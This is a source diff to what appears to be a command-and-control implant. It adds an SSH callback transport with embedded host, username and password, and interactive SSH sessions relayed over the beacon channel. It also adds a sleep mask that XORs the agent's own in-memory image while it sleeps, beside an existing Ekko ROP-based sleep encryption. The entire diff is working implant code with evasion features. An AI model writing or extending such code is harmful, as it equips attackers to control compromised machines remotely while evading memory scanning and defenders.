@@ -12,6 +12,7 @@
 #include <socks.h>
 #include <rpfwd.h>
 #include <ssh.h>
+#include <ssh_client.h>
 #include <transport_tcp.h>
 
 using namespace stardust;
@@ -91,6 +92,12 @@ declfn instance::instance(
 #endif
 #ifdef INCLUDE_CMD_SSH
     ssh_state = nullptr;
+    interactive_queue.buffer = nullptr;
+    interactive_queue.length = 0;
+    interactive_queue.capacity = 0;
+    for ( uint32_t i = 0; i < MAX_INTERACTIVE_SESSIONS; i++ ) {
+        interactive_sessions[i].active = false;
+    }
 #endif
 #ifdef INCLUDE_CMD_BROWSERPIVOT
     browserpivot_state = nullptr;
@@ -254,6 +261,32 @@ auto declfn instance::parse_config() -> bool {
     transport.callback_port = parser_int32( &p );
 #endif
 
+#if defined( SSH_TRANSPORT )
+    {
+        auto host = parser_string( &p, &slen );
+        if ( host && slen > 0 ) {
+            memory::copy( transport.callback_host, host, slen );
+            transport.callback_host[slen] = '\0';
+        }
+
+        transport.callback_port = parser_int32( &p );
+
+        auto user = parser_string( &p, &slen );
+        if ( user && slen > 0 ) {
+            memory::copy( transport.ssh_username, user, slen );
+            transport.ssh_username[slen] = '\0';
+        }
+
+        auto pass = parser_string( &p, &slen );
+        if ( pass && slen > 0 ) {
+            memory::copy( transport.ssh_password, pass, slen );
+            transport.ssh_password[slen] = '\0';
+        }
+
+        transport.ssh_mode = parser_int32( &p );
+    }
+#endif
+
     agent.checked_in = false;
     agent.running    = true;
 
@@ -319,7 +352,11 @@ auto declfn instance::sleep_with_jitter() -> void {
         sleep_time = sleep_time - jitter_range / 2 + jitter;
     }
 
-#if SLEEP_MASK_TYPE == MASK_EKKO && defined(_WIN64)
+#if SLEEP_MASK_TYPE == MASK_FULL_IMAGE
+    /* Full image mask owns entire sleep cycle: XOR → sleep → un-XOR.
+     * Can't use pre/post split - return path would execute XOR'd code. */
+    evasion_full_image_sleep( *this, sleep_time );
+#elif SLEEP_MASK_TYPE == MASK_EKKO && defined(_WIN64)
     /* Ekko replaces the entire sleep cycle: encrypt → sleep → decrypt
      * via timer-queue ROP. The pre/post hooks and NtDelayExecution are
      * handled internally by evasion_ekko_sleep. */
@@ -485,7 +522,77 @@ auto declfn instance::beacon_loop() -> void {
             starburst::rpfwd_poll( *this );
         }
 #endif
-        /* SSH is one-shot deployment - no polling needed */
+#ifdef INCLUDE_CMD_SSH
+        // poll interactive SSH sessions for output
+        for ( uint32_t si = 0; si < MAX_INTERACTIVE_SESSIONS; si++ ) {
+            auto& isess = interactive_sessions[si];
+            if ( !isess.active ) continue;
+
+            if ( !starburst::ssh_session_alive( *this, isess.ssh_session_idx ) ) {
+                // session died - send exit message and mark inactive
+                // exit message: [task_uuid(36)][msg_type(1)][data_len(4)][data(0)]
+                uint32_t exit_entry = 36 + 1 + 4;
+                uint32_t needed = interactive_queue.length + 4 + exit_entry;
+                if ( needed > interactive_queue.capacity ) {
+                    uint32_t nc = interactive_queue.capacity == 0 ? 4096 : interactive_queue.capacity;
+                    while ( nc < needed ) nc *= 2;
+                    interactive_queue.buffer = static_cast<uint8_t*>(
+                        heap_realloc( interactive_queue.buffer, nc ) );
+                    interactive_queue.capacity = nc;
+                }
+                auto qb = interactive_queue.buffer + interactive_queue.length;
+                qb[0] = ( exit_entry >> 24 ) & 0xFF;
+                qb[1] = ( exit_entry >> 16 ) & 0xFF;
+                qb[2] = ( exit_entry >> 8 )  & 0xFF;
+                qb[3] = exit_entry & 0xFF;
+                qb += 4;
+                memory::copy( qb, isess.task_uuid, 36 ); qb += 36;
+                *qb++ = INTERACTIVE_EXIT;
+                qb[0] = 0; qb[1] = 0; qb[2] = 0; qb[3] = 0;
+                interactive_queue.length += 4 + exit_entry;
+
+                // complete the task
+                starburst::queue_response( *this, isess.task_uuid, RESPONSE_SUCCESS,
+                    symbol<char*>( const_cast<char*>( "session closed" ) ) );
+                isess.active = false;
+                continue;
+            }
+
+            uint8_t* ssh_out = nullptr;
+            uint32_t ssh_out_len = 0;
+            starburst::ssh_channel_read_nb( *this, isess.ssh_session_idx, &ssh_out, &ssh_out_len );
+
+            if ( ssh_out && ssh_out_len > 0 ) {
+                // queue as interactive output
+                uint32_t entry_size = 36 + 1 + 4 + ssh_out_len;
+                uint32_t needed = interactive_queue.length + 4 + entry_size;
+                if ( needed > interactive_queue.capacity ) {
+                    uint32_t nc = interactive_queue.capacity == 0 ? 4096 : interactive_queue.capacity;
+                    while ( nc < needed ) nc *= 2;
+                    interactive_queue.buffer = static_cast<uint8_t*>(
+                        heap_realloc( interactive_queue.buffer, nc ) );
+                    interactive_queue.capacity = nc;
+                }
+                auto qb = interactive_queue.buffer + interactive_queue.length;
+                qb[0] = ( entry_size >> 24 ) & 0xFF;
+                qb[1] = ( entry_size >> 16 ) & 0xFF;
+                qb[2] = ( entry_size >> 8 )  & 0xFF;
+                qb[3] = entry_size & 0xFF;
+                qb += 4;
+                memory::copy( qb, isess.task_uuid, 36 ); qb += 36;
+                *qb++ = INTERACTIVE_OUTPUT;
+                qb[0] = ( ssh_out_len >> 24 ) & 0xFF;
+                qb[1] = ( ssh_out_len >> 16 ) & 0xFF;
+                qb[2] = ( ssh_out_len >> 8 )  & 0xFF;
+                qb[3] = ssh_out_len & 0xFF;
+                qb += 4;
+                memory::copy( qb, ssh_out, ssh_out_len );
+                interactive_queue.length += 4 + entry_size;
+
+                heap_free( ssh_out );
+            }
+        }
+#endif
 
         // build get_tasking request
         auto pkg = starburst::package_create( *this );
@@ -527,6 +634,49 @@ auto declfn instance::beacon_loop() -> void {
         } else {
             starburst::package_add_int32( *this, pkg, 0 );
         }
+
+#ifdef INCLUDE_CMD_SSH
+        // append interactive messages as ACTION_INTERACTIVE_MSG section
+        if ( interactive_queue.length > 0 ) {
+            starburst::package_add_byte( *this, pkg, ACTION_INTERACTIVE_MSG );
+
+            // count entries
+            uint32_t icount = 0;
+            uint32_t ipos = 0;
+            while ( ipos + 4 <= interactive_queue.length ) {
+                uint32_t elen = ( interactive_queue.buffer[ipos] << 24 ) |
+                                ( interactive_queue.buffer[ipos+1] << 16 ) |
+                                ( interactive_queue.buffer[ipos+2] << 8 ) |
+                                  interactive_queue.buffer[ipos+3];
+                ipos += 4 + elen;
+                icount++;
+            }
+            starburst::package_add_int32( *this, pkg, icount );
+
+            // write each entry (strip length prefix, write raw)
+            ipos = 0;
+            while ( ipos + 4 <= interactive_queue.length ) {
+                uint32_t elen = ( interactive_queue.buffer[ipos] << 24 ) |
+                                ( interactive_queue.buffer[ipos+1] << 16 ) |
+                                ( interactive_queue.buffer[ipos+2] << 8 ) |
+                                  interactive_queue.buffer[ipos+3];
+                ipos += 4;
+                auto entry = interactive_queue.buffer + ipos;
+                // grow package buffer and append raw entry
+                if ( pkg->length + elen > pkg->capacity ) {
+                    uint32_t nc = pkg->capacity;
+                    while ( nc < pkg->length + elen ) nc *= 2;
+                    pkg->buffer = static_cast<uint8_t*>( heap_realloc( pkg->buffer, nc ) );
+                    pkg->capacity = nc;
+                }
+                memory::copy( pkg->buffer + pkg->length, entry, elen );
+                pkg->length += elen;
+                ipos += elen;
+            }
+
+            interactive_queue.length = 0;
+        }
+#endif
 
         uint32_t data_len = 0;
         auto data = starburst::package_build( pkg, &data_len );
@@ -651,6 +801,40 @@ auto declfn instance::beacon_loop() -> void {
                             auto rdata = reinterpret_cast<uint8_t*>(
                                 starburst::parser_string( &rsp, &rdata_len ) );
                             starburst::rpfwd_route( *this, rid, rdata, rdata_len, rexit != 0 );
+                        }
+                    }
+#endif
+#ifdef INCLUDE_CMD_SSH
+                    else if ( section_action == ACTION_INTERACTIVE_MSG ) {
+                        uint32_t int_count = starburst::parser_int32( &rsp );
+                        for ( uint32_t ii = 0; ii < int_count; ii++ ) {
+                            auto uuid_raw = starburst::parser_raw( &rsp, 36 );
+                            uint8_t imsg_type = starburst::parser_byte( &rsp );
+                            uint32_t idata_len = 0;
+                            auto idata = reinterpret_cast<uint8_t*>(
+                                starburst::parser_string( &rsp, &idata_len ) );
+
+                            if ( !uuid_raw || !idata ) continue;
+
+                            // find matching interactive session
+                            for ( uint32_t si = 0; si < MAX_INTERACTIVE_SESSIONS; si++ ) {
+                                auto& isess = interactive_sessions[si];
+                                if ( !isess.active ) continue;
+                                if ( starburst::str_ncmp( isess.task_uuid,
+                                        reinterpret_cast<char*>( uuid_raw ), 36 ) != 0 ) continue;
+
+                                if ( imsg_type == INTERACTIVE_EXIT ) {
+                                    // user closed terminal - disconnect SSH
+                                    starburst::ssh_disconnect( *this, isess.ssh_session_idx );
+                                    starburst::queue_response( *this, isess.task_uuid, RESPONSE_SUCCESS,
+                                        symbol<char*>( const_cast<char*>( "session closed" ) ) );
+                                    isess.active = false;
+                                } else if ( imsg_type == INTERACTIVE_INPUT && idata_len > 0 ) {
+                                    starburst::ssh_channel_write( *this, isess.ssh_session_idx,
+                                        idata, idata_len );
+                                }
+                                break;
+                            }
                         }
                     }
 #endif
